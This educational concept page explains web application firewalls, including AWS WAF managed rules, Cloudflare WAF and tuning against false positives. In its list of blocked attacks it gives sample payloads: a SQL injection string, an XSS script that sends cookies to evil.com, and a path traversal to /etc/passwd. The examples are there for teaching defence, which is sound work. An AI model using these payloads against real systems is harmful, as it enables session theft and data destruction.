---
id: waf
title: Web Application Firewalls
zone: scaling
edges:
  to: []
difficulty: 2
tags:
  - waf
  - web-application-firewall
  - security
  - aws-waf
  - cloudflare
  - owasp
  - ddos
  - sql-injection
category: concept
milestones:
  - Explain what a WAF does and how it differs from a network firewall
  - Name three attack types in the OWASP Top 10 that a WAF blocks
  - Understand what managed rule groups are in AWS WAF
  - Explain what a false positive is and why WAF tuning is an ongoing process
  - Know when Cloudflare WAF makes more sense than rolling your own
---

A Web Application Firewall (WAF) inspects HTTP requests and blocks ones that look malicious. A network firewall controls which ports and IP addresses can communicate; a WAF understands HTTP deeply enough to tell a normal form submission from a SQL injection attempt, a legitimate page request from a path traversal attack. It sits in front of your application and acts as a filter for application-layer attacks.

<!-- DEEP_DIVE -->

## What a WAF blocks

WAFs operate against a ruleset. The OWASP Top 10 defines the most common web application vulnerabilities, and most WAF rule sets cover them:

- **SQL injection**: `'; DROP TABLE users; --` in form fields, query parameters, headers
- **Cross-site scripting (XSS)**: `<script>document.location='https://evil.com/'+document.cookie</script>` in user inputs that get reflected back in HTML
- **Path traversal**: `../../../../etc/passwd` in file path parameters
- **Remote code execution**: attempts to inject shell commands or exploit known vulnerabilities in frameworks/libraries
- **Malicious bots and scanners**: automated vulnerability scanners (Nikto, Nessus), content scrapers, credential stuffing attacks

The WAF inspects request URI, headers, query string, and body against these patterns. Matching requests are blocked (or flagged for review) before they reach your application.

## WAF vs network firewall

A **network firewall** (security group, NACL, hardware firewall) operates at Layer 3/4: IP addresses and ports. It blocks traffic from banned IPs or to closed ports. It cannot see HTTP content.

A **WAF** operates at Layer 7: it parses HTTP requests and inspects their content. It can block a request to port 443 from a valid IP if the request body contains a SQL injection payload. The two are complementary — use a network firewall to control which services are publicly reachable, and a WAF to filter malicious HTTP traffic that reaches your public endpoints.

## AWS WAF

AWS WAF integrates with CloudFront, ALB, and API Gateway. You define **WebACLs** (Access Control Lists) containing rules and rule groups. AWS provides managed rule groups for common threats:

- **AWS-AWSManagedRulesCommonRuleSet**: general web protection (XSS, SQL injection, path traversal)
- **AWS-AWSManagedRulesKnownBadInputsRuleSet**: known-bad request patterns
- **AWS-AWSManagedRulesAmazonIpReputationList**: blocks IPs with bad reputation (botnets, known scanners)
- **AWS-AWSManagedRulesBotControlRuleSet**: bot management with CAPTCHA support

You can also write custom rules: block requests from specific countries, limit request size, require specific headers.

AWS WAF pricing is per WebACL per region, per million requests, and per rule group — add these costs up before enabling everything.

## Cloudflare WAF

Cloudflare sits between the internet and your origin as a global CDN and WAF simultaneously. Traffic is proxied through Cloudflare's global network, which filters malicious requests, serves cached content, and terminates DDoS attacks before traffic reaches your servers. For publicly accessible web applications, Cloudflare's free and Pro tiers include substantial WAF capabilities.

Cloudflare is operationally simpler than AWS WAF for many use cases — point your DNS at Cloudflare, enable WAF, done. The trade-off is that your traffic flows through a third party.

## False positives and tuning

WAFs are not set-and-forget. Rules designed to catch attacks can also block legitimate requests:
- A product review mentioning `"I clicked submit and it <worked>"` might match an XSS rule
- A search query with `SELECT` in it might match a SQL injection rule
- API endpoints expecting certain character sequences in request bodies

When enabling a WAF, start in **count mode** (log matching requests but don't block them). Review the logs for false positives. Adjust rules or add exceptions for known-good patterns. Then switch to block mode. Revisit after significant application changes.

WAF tuning is ongoing, not a one-time task.

<!-- RESOURCES -->

- [OWASP Top 10](https://owasp.org/www-project-top-ten/) -- type: article, time: 20m
- [AWS WAF Documentation](https://docs.aws.amazon.com/waf/latest/developerguide/waf-chapter.html) -- type: docs, time: 30m
- [Cloudflare WAF](https://www.cloudflare.com/waf/) -- type: article, time: 10m
- [AWS Managed Rule Groups](https://docs.aws.amazon.com/waf/latest/developerguide/aws-managed-rule-groups-list.html) -- type: docs, time: 15m
